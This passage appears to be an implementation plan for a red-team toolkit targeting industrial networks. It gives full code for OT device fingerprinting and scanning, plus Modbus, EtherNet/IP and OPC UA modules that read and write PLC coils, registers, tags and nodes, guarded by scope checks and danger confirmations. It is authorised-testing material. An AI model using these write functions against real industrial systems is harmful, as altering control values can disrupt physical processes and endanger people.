Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/discovery/service_id.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/discovery/service_id.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/discovery/service_id.sh
git commit -m "feat: add service identification module with OT port detection"
```

---

### Task 2.3: Create OT Fingerprint Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/discovery/ot_fingerprint.sh`
- Create: `library/user/general/red-team-toolkit/wordlists/ics-oui.txt`

**Step 1: Write ics-oui.txt**

```
# ICS/OT Vendor MAC OUI Prefixes
# Format: OUI,Vendor
00:00:BC,Rockwell Automation
00:01:05,Beckhoff Automation
00:0B:AB,Advantech
00:0E:8C,Siemens AG
00:1C:06,Siemens AG
00:1F:F8,Siemens AG
00:30:DE,Wago
00:40:84,Honeywell
00:50:C2,IEEE (often PLCs)
00:60:35,Dallas Semiconductor
00:80:F4,Schneider Electric
00:A0:12,Schneider Electric
00:C0:E4,Siemens Automation
08:00:06,Siemens AG
08:00:86,GE Fanuc
28:63:36,Siemens AG
48:50:73,Rockwell Automation
5C:86:5C,Honeywell
64:00:F1,Cisco (Industrial)
70:B3:D5,Moxa
80:09:02,ABB
98:5D:AD,Rockwell Automation
AC:64:17,Honeywell
B4:B5:2F,Hewlett-Packard (Historians)
C8:3E:A7,Siemens AG
D4:8C:B5,Cisco (Industrial)
E0:DC:A0,Siemens AG
```

**Step 2: Write ot_fingerprint.sh**

```bash
#!/bin/bash
# OT Device Fingerprinting - MAC OUI lookup, port-based classification

rt_ot_fingerprint() {
  local choice
  choice=$(menu_pick "OT Fingerprint" \
    "Fingerprint Single IP" \
    "Scan Subnet for OT Devices" \
    "Passive Broadcast Listen")
  
  case "$choice" in
    1) rt_fingerprint_single ;;
    2) rt_fingerprint_subnet ;;
    3) rt_fingerprint_passive ;;
    0|"") return ;;
  esac
}

rt_fingerprint_single() {
  local target
  target=$(IP_PICKER "Target IP" "${TARGET_NETWORK%%/*}")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile="$ARTIFACT_DIR/fingerprint_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Fingerprinting $target..."
  
  {
    echo "=== OT Fingerprint: $target ==="
    echo "Timestamp: $(date)"
    echo ""
    
    # Get MAC via ARP
    local mac=""
    if have arp; then
      mac=$(arp -n "$target" 2>/dev/null | awk '/ether/{print $3}')
    elif have ip; then
      mac=$(ip neigh show "$target" 2>/dev/null | awk '{print $5}')
    fi
    
    if [[ -n "$mac" ]]; then
      echo "MAC Address: $mac"
      local oui="${mac:0:8}"
      oui="${oui^^}"  # uppercase
      oui="${oui//:/-}"
      
      # Lookup OUI
      local vendor=""
      if [[ -f "$TOOLKIT_DIR/wordlists/ics-oui.txt" ]]; then
        vendor=$(grep -i "^${oui:0:8}" "$TOOLKIT_DIR/wordlists/ics-oui.txt" 2>/dev/null | cut -d',' -f2)
      fi
      echo "Vendor (OUI): ${vendor:-Unknown}"
    else
      echo "MAC Address: (not in ARP cache - try ping first)"
    fi
    
    echo ""
    echo "=== Open OT Ports ==="
    
    # Check OT ports and classify
    local device_type="Unknown"
    local protocols=""
    
    if port_open "$target" 502 2; then
      echo "[OPEN] 502/tcp - Modbus/TCP"
      protocols="$protocols Modbus"
    fi
    if port_open "$target" 44818 2; then
      echo "[OPEN] 44818/tcp - EtherNet/IP"
      protocols="$protocols EtherNet/IP"
    fi
    if port_open "$target" 102 2; then
      echo "[OPEN] 102/tcp - S7comm (Siemens)"
      protocols="$protocols S7comm"
      device_type="Siemens PLC"
    fi
    if port_open "$target" 4840 2; then
      echo "[OPEN] 4840/tcp - OPC UA"
      protocols="$protocols OPC-UA"
    fi
    if port_open "$target" 47808 2; then
      echo "[OPEN] 47808/udp - BACnet"
      protocols="$protocols BACnet"
      device_type="BACnet Device"
    fi
    if port_open "$target" 20000 2; then
      echo "[OPEN] 20000/tcp - DNP3"
      protocols="$protocols DNP3"
    fi
    if port_open "$target" 80 2 || port_open "$target" 443 2; then
      echo "[OPEN] HTTP/HTTPS - Web Interface"
      protocols="$protocols Web"
    fi
    if port_open "$target" 22 2; then
      echo "[OPEN] 22/tcp - SSH"
    fi
    if port_open "$target" 3389 2; then
      echo "[OPEN] 3389/tcp - RDP"
      device_type="Windows (HMI/Historian?)"
    fi
    
    echo ""
    echo "=== Classification ==="
    echo "Device Type: $device_type"
    echo "Protocols: ${protocols:-None detected}"
    
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

rt_fingerprint_subnet() {
  local target
  target=$(TEXT_PICKER "Subnet (CIDR)" "$TARGET_NETWORK")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile="$ARTIFACT_DIR/ot_subnet_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Scanning $target for OT devices..."
  LOG "This may take a while..."
  
  # First, get live hosts
  local live_hosts="$ARTIFACT_DIR/.live_hosts_tmp"
  
  if have nmap; then
    nmap -sn "$target" -oG - 2>/dev/null | grep "Up" | awk '{print $2}' > "$live_hosts"
  elif have fping; then
    fping -a -g "$target" 2>/dev/null > "$live_hosts"
  else
    LOG red "Need nmap or fping for subnet scan"
    return 1
  fi
  
  local count
  count=$(wc -l < "$live_hosts")
  LOG "Found $count live hosts, checking for OT ports..."
  
  {
    echo "=== OT Subnet Scan: $target ==="
    echo "Timestamp: $(date)"
    echo "Live hosts: $count"
    echo ""
    
    while read -r ip; do
      local ot_found=0
      local ot_info=""
      
      for port in 502 44818 102 4840 20000 47808; do
        if port_open "$ip" "$port" 1; then
          ot_found=1
          case $port in
            502) ot_info="$ot_info Modbus" ;;
            44818) ot_info="$ot_info EtherNet/IP" ;;
            102) ot_info="$ot_info S7comm" ;;
            4840) ot_info="$ot_info OPC-UA" ;;
            20000) ot_info="$ot_info DNP3" ;;
            47808) ot_info="$ot_info BACnet" ;;
          esac
        fi
      done
      
      if [[ $ot_found -eq 1 ]]; then
        echo "[OT] $ip -$ot_info"
      fi
    done < "$live_hosts"
    
  } | tee "$outfile"
  
  rm -f "$live_hosts"
  LOG green "Results: $outfile"
}

rt_fingerprint_passive() {
  local duration
  duration=$(NUMBER_PICKER "Listen duration (seconds)" 60)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile="$ARTIFACT_DIR/passive_ot_$(ts).pcap"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Passive listening for $duration seconds..."
  LOG "Capturing: ARP, mDNS, LLDP, Profinet DCP, BACnet broadcasts"
  
  if have tcpdump; then
    # Capture broadcast/multicast traffic common in OT environments
    with_spinner "Listening" run_timeboxed "$duration" \
      tcpdump -i any -w "$outfile" \
      'arp or port 5353 or ether proto 0x88cc or udp port 34964 or udp port 47808' \
      2>/dev/null
    
    LOG green "Capture saved: $outfile"
    LOG "Analyze with: tcpdump -r $outfile"
  else
    LOG red "tcpdump required for passive capture"
    return 1
  fi
}
```

**Step 3: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/discovery/ot_fingerprint.sh`
Expected: No output (success)

**Step 4: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/discovery/ot_fingerprint.sh`
Expected: No errors

**Step 5: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/discovery/ot_fingerprint.sh
git add library/user/general/red-team-toolkit/wordlists/ics-oui.txt
git commit -m "feat: add OT fingerprint module with MAC OUI lookup and passive capture"
```

---

### Task 2.4: Create Asset Inventory Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/discovery/asset_inventory.sh`

**Step 1: Write asset_inventory.sh**

```bash
#!/bin/bash
# Asset inventory aggregation and display

rt_asset_inventory() {
  local choice
  choice=$(menu_pick "Asset Inventory" \
    "View Current Inventory" \
    "Rebuild from Scan Results" \
    "Export to CSV" \
    "Clear Inventory")
  
  case "$choice" in
    1) rt_view_inventory ;;
    2) rt_rebuild_inventory ;;
    3) rt_export_inventory ;;
    4) rt_clear_inventory ;;
    0|"") return ;;
  esac
}

rt_view_inventory() {
  local inv_file="$ARTIFACT_DIR/inventory.txt"
  
  if [[ ! -f "$inv_file" ]]; then
    LOG "No inventory yet. Run scans first, then rebuild."
    return
  fi
  
  LOG blue "=== Asset Inventory ==="
  cat "$inv_file"
  LOG ""
  LOG "Total entries: $(wc -l < "$inv_file")"
}

rt_rebuild_inventory() {
  local inv_file="$ARTIFACT_DIR/inventory.txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Rebuilding inventory from scan results..."
  
  # Aggregate IPs from various scan outputs
  {
    echo "# Asset Inventory - $(date)"
    echo "# IP | MAC | Vendor | Ports | Type"
    echo "#-----------------------------------"
    
    # Parse ARP scan results
    if ls "$ARTIFACT_DIR"/arp_scan_*.txt 1>/dev/null 2>&1; then
      grep -h "^\([0-9]\)" "$ARTIFACT_DIR"/arp_scan_*.txt 2>/dev/null | \
        awk '{print $1 " | " $2 " | " $3}' | sort -u
    fi
    
    # Parse fingerprint results
    if ls "$ARTIFACT_DIR"/fingerprint_*.txt 1>/dev/null 2>&1; then
      for f in "$ARTIFACT_DIR"/fingerprint_*.txt; do
        local ip
        ip=$(grep "OT Fingerprint:" "$f" | awk '{print $NF}')
        local mac
        mac=$(grep "MAC Address:" "$f" | awk '{print $NF}')
        local vendor
        vendor=$(grep "Vendor (OUI):" "$f" | cut -d: -f2-)
        local dtype
        dtype=$(grep "Device Type:" "$f" | cut -d: -f2-)
        
        [[ -n "$ip" ]] && echo "$ip | ${mac:-?} | ${vendor:-?} | | ${dtype:-?}"
      done
    fi
    
    # Parse OT subnet scans
    if ls "$ARTIFACT_DIR"/ot_subnet_*.txt 1>/dev/null 2>&1; then
      grep -h "^\[OT\]" "$ARTIFACT_DIR"/ot_subnet_*.txt 2>/dev/null | \
        awk '{print $2 " | | | " substr($0, index($0,$4)) " | OT Device"}' | sort -u
    fi
    
  } | sort -t'|' -k1 -u > "$inv_file"
  
  LOG green "Inventory rebuilt: $inv_file"
  LOG "Entries: $(grep -v "^#" "$inv_file" | wc -l)"
}

rt_export_inventory() {
  local inv_file="$ARTIFACT_DIR/inventory.txt"
  local csv_file="$ARTIFACT_DIR/inventory_$(ts).csv"
  
  if [[ ! -f "$inv_file" ]]; then
    LOG red "No inventory to export. Rebuild first."
    return 1
  fi
  
  LOG blue "Exporting to CSV..."
  
  {
    echo "IP,MAC,Vendor,Ports,Type"
    grep -v "^#" "$inv_file" | sed 's/ | /,/g'
  } > "$csv_file"
  
  LOG green "Exported: $csv_file"
}

rt_clear_inventory() {
  if confirm_danger "Clear asset inventory?"; then
    rm -f "$ARTIFACT_DIR/inventory.txt"
    LOG "Inventory cleared"
  fi
}
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/discovery/asset_inventory.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/discovery/asset_inventory.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/discovery/asset_inventory.sh
git commit -m "feat: add asset inventory module with rebuild and CSV export"
```

---

## Phase 3: OT Protocol Modules (Tier 1)

### Task 3.1: Enhance Modbus Module with Read/Write

**Files:**
- Modify: `library/user/general/red-team-toolkit/scripts/modules/modbus_scan.sh` → Move to `ot-protocols/modbus.sh`

**Step 1: Create enhanced modbus.sh**

```bash
#!/bin/bash
# Modbus/TCP module - scan, read, write

rt_modbus() {
  local target
  target=$(IP_PICKER "Modbus target" "192.168.1.10")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$target"; then
    LOG red "Target $target not in scope"
    return 1
  fi
  
  local port
  port=$(NUMBER_PICKER "Port" 502)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local choice
  choice=$(menu_pick "Modbus: $target:$port" \
    "Device Identification" \
    "Read Coils (0x)" \
    "Read Discrete Inputs (1x)" \
    "Read Holding Registers (4x)" \
    "Read Input Registers (3x)" \
    "Write Single Coil" \
    "Write Single Register")
  
  case "$choice" in
    1) modbus_identify "$target" "$port" ;;
    2) modbus_read "$target" "$port" "coils" ;;
    3) modbus_read "$target" "$port" "discrete" ;;
    4) modbus_read "$target" "$port" "holding" ;;
    5) modbus_read "$target" "$port" "input" ;;
    6) modbus_write_coil "$target" "$port" ;;
    7) modbus_write_register "$target" "$port" ;;
    0|"") return ;;
  esac
}

modbus_identify() {
  local target="$1" port="$2"
  local outfile="$ARTIFACT_DIR/modbus_id_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Modbus device identification: $target:$port"
  
  {
    echo "=== Modbus Device ID: $target:$port ==="
    echo "Timestamp: $(date)"
    echo ""
    
    if have mbpoll; then
      # Read Device Identification (function 0x2B/0x0E)
      mbpoll -a 1 -t 0 -r 0 -c 1 -1 "$target" -p "$port" 2>&1 || true
    elif have nmap; then
      nmap -p "$port" --script modbus-discover "$target" 2>&1
    else
      # Raw: Send Report Server ID (0x11)
      LOG "Sending raw Report Server ID..."
      printf '\x00\x01\x00\x00\x00\x02\x01\x11' | \
        nc -w 3 "$target" "$port" 2>/dev/null | hexdump -C
    fi
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

modbus_read() {
  local target="$1" port="$2" type="$3"
  
  local unit_id
  unit_id=$(NUMBER_PICKER "Unit ID (slave)" 1)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local start_addr
  start_addr=$(NUMBER_PICKER "Start address" 0)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local count
  count=$(NUMBER_PICKER "Count" 10)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile="$ARTIFACT_DIR/modbus_read_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  local mbpoll_type
  case "$type" in
    coils) mbpoll_type=0 ;;
    discrete) mbpoll_type=1 ;;
    holding) mbpoll_type=4 ;;
    input) mbpoll_type=3 ;;
  esac
  
  LOG blue "Reading $type from $target (unit $unit_id, addr $start_addr, count $count)"
  
  {
    echo "=== Modbus Read: $type ==="
    echo "Target: $target:$port, Unit: $unit_id"
    echo "Address: $start_addr, Count: $count"
    echo ""
    
    if have mbpoll; then
      mbpoll -a "$unit_id" -t "$mbpoll_type" -r "$start_addr" -c "$count" -1 \
        "$target" -p "$port" 2>&1
    elif [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
      laptop_exec "mbpoll -a $unit_id -t $mbpoll_type -r $start_addr -c $count -1 $target -p $port"
    else
      LOG red "mbpoll not available"
    fi
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

modbus_write_coil() {
  local target="$1" port="$2"
  
  if ! check_passive; then return 1; fi
  if ! confirm_danger "WRITE to Modbus coil on $target. This may affect process!"; then
    return 1
  fi
  
  local unit_id
  unit_id=$(NUMBER_PICKER "Unit ID" 1)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local addr
  addr=$(NUMBER_PICKER "Coil address" 0)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local value
  value=$(NUMBER_PICKER "Value (0=OFF, 1=ON)" 0)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG red "WRITING coil $addr = $value on $target"
  
  if have mbpoll; then
    mbpoll -a "$unit_id" -t 0 -r "$addr" -1 "$target" -p "$port" -- "$value"
  else
    LOG red "mbpoll required for write operations"
  fi
}

modbus_write_register() {
  local target="$1" port="$2"
  
  if ! check_passive; then return 1; fi
  if ! confirm_danger "WRITE to Modbus register on $target. This may affect process!"; then
    return 1
  fi
  
  local unit_id
  unit_id=$(NUMBER_PICKER "Unit ID" 1)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local addr
  addr=$(NUMBER_PICKER "Register address" 0)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local value
  value=$(NUMBER_PICKER "Value" 0)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG red "WRITING register $addr = $value on $target"
  
  if have mbpoll; then
    mbpoll -a "$unit_id" -t 4 -r "$addr" -1 "$target" -p "$port" -- "$value"
  else
    LOG red "mbpoll required for write operations"
  fi
}
```

**Step 2: Move old file and verify**

```bash
mv library/user/general/red-team-toolkit/scripts/modules/modbus_scan.sh \
   library/user/general/red-team-toolkit/scripts/modules/modbus_scan.sh.bak 2>/dev/null || true
```

**Step 3: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/ot-protocols/modbus.sh`
Expected: No output (success)

**Step 4: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/ot-protocols/modbus.sh`
Expected: No errors

**Step 5: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/ot-protocols/modbus.sh
git commit -m "feat: enhance Modbus module with read/write capabilities"
```

---

### Task 3.2: Create EtherNet/IP Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/ot-protocols/enip_cip.sh`

**Step 1: Write enip_cip.sh**

```bash
#!/bin/bash
# EtherNet/IP (CIP) module - identity, tag enumeration, read/write

rt_enip_cip() {
  local target
  target=$(IP_PICKER "EtherNet/IP target" "192.168.1.10")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$target"; then
    LOG red "Target $target not in scope"
    return 1
  fi
  
  local choice
  choice=$(menu_pick "EtherNet/IP: $target" \
    "Device Identity (List Identity)" \
    "List Services" \
    "Enumerate Tags (if supported)" \
    "Read Tag" \
    "Write Tag")
  
  case "$choice" in
    1) enip_identity "$target" ;;
    2) enip_services "$target" ;;
    3) enip_tags "$target" ;;
    4) enip_read_tag "$target" ;;
    5) enip_write_tag "$target" ;;
    0|"") return ;;
  esac
}

enip_identity() {
  local target="$1"
  local port=44818
  local outfile="$ARTIFACT_DIR/enip_id_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "EtherNet/IP List Identity: $target"
  
  {
    echo "=== EtherNet/IP Identity: $target ==="
    echo "Timestamp: $(date)"
    echo ""
    
    if have nmap; then
      nmap -p "$port" --script enip-info "$target" 2>&1
    else
      # Raw List Identity request
      # EtherNet/IP encapsulation: Command 0x0063 (List Identity)
      LOG "Sending raw List Identity..."
      printf '\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | \
        nc -u -w 3 "$target" "$port" 2>/dev/null | hexdump -C
    fi
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

enip_services() {
  local target="$1"
  local port=44818
  local outfile="$ARTIFACT_DIR/enip_services_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "EtherNet/IP List Services: $target"
  
  {
    echo "=== EtherNet/IP Services: $target ==="
    
    # Raw List Services request (command 0x0004)
    printf '\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | \
      nc -w 3 "$target" "$port" 2>/dev/null | hexdump -C
      
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

enip_tags() {
  local target="$1"
  local outfile="$ARTIFACT_DIR/enip_tags_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Enumerating tags on $target..."
  LOG "Note: Requires cpppo or pycomm3 on laptop"
  
  if [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    {
      echo "=== EtherNet/IP Tags: $target ==="
      laptop_exec "python3 -c \"
from pycomm3 import LogixDriver
with LogixDriver('$target') as plc:
    tags = plc.get_tag_list()
    for tag in tags[:50]:  # First 50
        print(f'{tag.tag_name}: {tag.data_type}')
\" 2>&1" || echo "pycomm3 not available or connection failed"
    } | tee "$outfile"
  else
    LOG red "Tag enumeration requires laptop mode with pycomm3"
    return 1
  fi
  
  LOG green "Results: $outfile"
}

enip_read_tag() {
  local target="$1"
  
  local tag_name
  tag_name=$(TEXT_PICKER "Tag name" "Program:MainProgram.TagName")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Reading tag '$tag_name' from $target"
  
  if [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    laptop_exec "python3 -c \"
from pycomm3 import LogixDriver
with LogixDriver('$target') as plc:
    result = plc.read('$tag_name')
    print(f'Value: {result.value}')
    print(f'Type: {result.type}')
\" 2>&1" || LOG red "Read failed"
  else
    LOG red "Tag read requires laptop mode with pycomm3"
  fi
}

enip_write_tag() {
  local target="$1"
  
  if ! check_passive; then return 1; fi
  if ! confirm_danger "WRITE to EtherNet/IP tag on $target. This may affect process!"; then
    return 1
  fi
  
  local tag_name
  tag_name=$(TEXT_PICKER "Tag name" "Program:MainProgram.TagName")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local value
  value=$(TEXT_PICKER "Value" "0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG red "WRITING tag '$tag_name' = $value on $target"
  
  if [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    laptop_exec "python3 -c \"
from pycomm3 import LogixDriver
with LogixDriver('$target') as plc:
    result = plc.write('$tag_name', $value)
    print(f'Write result: {result}')
\" 2>&1" || LOG red "Write failed"
  else
    LOG red "Tag write requires laptop mode with pycomm3"
  fi
}
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/ot-protocols/enip_cip.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/ot-protocols/enip_cip.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/ot-protocols/enip_cip.sh
git commit -m "feat: add EtherNet/IP CIP module with identity and tag operations"
```

---

### Task 3.3: Enhance OPC UA Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/ot-protocols/opcua.sh`

**Step 1: Write opcua.sh**

```bash
#!/bin/bash
# OPC UA module - browse, read, write

rt_opcua() {
  local target
  target=$(IP_PICKER "OPC UA server" "192.168.1.10")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$target"; then
    LOG red "Target $target not in scope"
    return 1
  fi
  
  local port
  port=$(NUMBER_PICKER "Port" 4840)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local choice
  choice=$(menu_pick "OPC UA: $target:$port" \
    "Get Endpoints" \
    "Browse Root" \
    "Browse Node" \
    "Read Node Value" \
    "Write Node Value" \
    "Check Security")
  
  case "$choice" in
    1) opcua_endpoints "$target" "$port" ;;
    2) opcua_browse "$target" "$port" "i=84" ;; # Root
    3) opcua_browse_custom "$target" "$port" ;;
    4) opcua_read "$target" "$port" ;;
    5) opcua_write "$target" "$port" ;;
    6) opcua_security "$target" "$port" ;;
    0|"") return ;;
  esac
}

opcua_endpoints() {
  local target="$1" port="$2"
  local url="opc.tcp://$target:$port"
  local outfile="$ARTIFACT_DIR/opcua_endpoints_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Getting OPC UA endpoints: $url"
  
  {
    echo "=== OPC UA Endpoints: $url ==="
    echo ""
    
    if have python3; then
      python3 -c "
from opcua import Client
try:
    client = Client('$url', timeout=10)
    endpoints = client.connect_and_get_server_endpoints()
    for ep in endpoints:
        print(f'Endpoint: {ep.EndpointUrl}')
        print(f'  Security Mode: {ep.SecurityMode}')
        print(f'  Security Policy: {ep.SecurityPolicyUri}')
        print()
except Exception as e:
    print(f'Error: {e}')
" 2>&1
    elif [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
      laptop_exec "python3 -c \"
from opcua import Client
client = Client('$url', timeout=10)
endpoints = client.connect_and_get_server_endpoints()
for ep in endpoints:
    print(f'Endpoint: {ep.EndpointUrl}')
    print(f'  Security Mode: {ep.SecurityMode}')
    print(f'  Security Policy: {ep.SecurityPolicyUri}')
\""
    else
      LOG "python3 with opcua library required"
    fi
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

opcua_browse() {
  local target="$1" port="$2" node_id="$3"
  local url="opc.tcp://$target:$port"
  local outfile="$ARTIFACT_DIR/opcua_browse_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Browsing OPC UA node: $node_id"
  
  {
    echo "=== OPC UA Browse: $url ==="
    echo "Node: $node_id"
    echo ""
    
    python3 -c "
from opcua import Client, ua
try:
    client = Client('$url', timeout=10)
    client.connect()
    node = client.get_node('$node_id')
    children = node.get_children()
    for child in children[:30]:  # Limit
        try:
            name = child.get_browse_name()
            print(f'{child.nodeid} - {name.Name}')
        except:
            print(f'{child.nodeid} - (error reading name)')
    client.disconnect()
except Exception as e:
    print(f'Error: {e}')
" 2>&1
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

opcua_browse_custom() {
  local target="$1" port="$2"
  
  local node_id
  node_id=$(TEXT_PICKER "Node ID" "i=84")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  opcua_browse "$target" "$port" "$node_id"
}

opcua_read() {
  local target="$1" port="$2"
  local url="opc.tcp://$target:$port"
  
  local node_id
  node_id=$(TEXT_PICKER "Node ID to read" "ns=2;s=TagName")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Reading OPC UA node: $node_id"
  
  python3 -c "
from opcua import Client
try:
    client = Client('$url', timeout=10)
    client.connect()
    node = client.get_node('$node_id')
    value = node.get_value()
    print(f'Value: {value}')
    print(f'Type: {type(value).__name__}')
    client.disconnect()
except Exception as e:
    print(f'Error: {e}')
" 2>&1
}

opcua_write() {
  local target="$1" port="$2"
  local url="opc.tcp://$target:$port"
  
  if ! check_passive; then return 1; fi
  if ! confirm_danger "WRITE to OPC UA node on $target. This may affect process!"; then
    return 1
  fi
  
  local node_id
  node_id=$(TEXT_PICKER "Node ID" "ns=2;s=TagName")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local value
  value=$(TEXT_PICKER "Value" "0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG red "WRITING to $node_id = $value"
  
  python3 -c "
from opcua import Client, ua
try:
    client = Client('$url', timeout=10)
    client.connect()
    node = client.get_node('$node_id')
    # Try to infer type and write
    current = node.get_value()
    if isinstance(current, bool):
        node.set_value(bool(int('$value')))
    elif isinstance(current, int):
        node.set_value(int('$value'))
    elif isinstance(current, float):
        node.set_value(float('$value'))
    else:
        node.set_value('$value')
    print('Write successful')
    client.disconnect()
except Exception as e:
    print(f'Error: {e}')
" 2>&1
}

opcua_security() {
  local target="$1" port="$2"
  local url="opc.tcp://$target:$port"
  local outfile="$ARTIFACT_DIR/opcua_security_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Checking OPC UA security configuration..."
  
  {
    echo "=== OPC UA Security Check: $url ==="
    echo ""
    
    python3 -c "
from opcua import Client
try:
    client = Client('$url', timeout=10)
    endpoints = client.connect_and_get_server_endpoints()
    
    insecure = []
    for ep in endpoints:
        mode = str(ep.SecurityMode)
        policy = ep.SecurityPolicyUri.split('#')[-1] if ep.SecurityPolicyUri else 'None'
        
        if 'None' in mode or 'None' in policy:
            insecure.append(f'{ep.EndpointUrl}: {mode}, {policy}')
    
    if insecure:
        print('[!] INSECURE ENDPOINTS FOUND:')
        for i in insecure:
            print(f'    {i}')
    else:
